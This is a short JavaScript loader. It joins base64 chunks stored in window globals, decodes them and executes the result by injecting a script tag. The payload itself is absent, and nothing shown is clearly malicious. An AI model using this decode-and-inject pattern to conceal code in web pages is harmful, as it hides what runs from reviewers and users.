(function(){
  try {
    var b64 = window.__C1+window.__C2+window.__C3+window.__C4+window.__C5+window.__C6+window.__C7+window.__C8;
    var bin = atob(b64);
    var bytes = new Uint8Array(bin.length);
    for (var i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i);
    var code = new TextDecoder('utf-8').decode(bytes);
    var s = document.createElement('script');
    s.textContent = code;
    document.head.appendChild(s);
  } catch(e) { document.title='LOAD-ERR '+e.message; }
})();
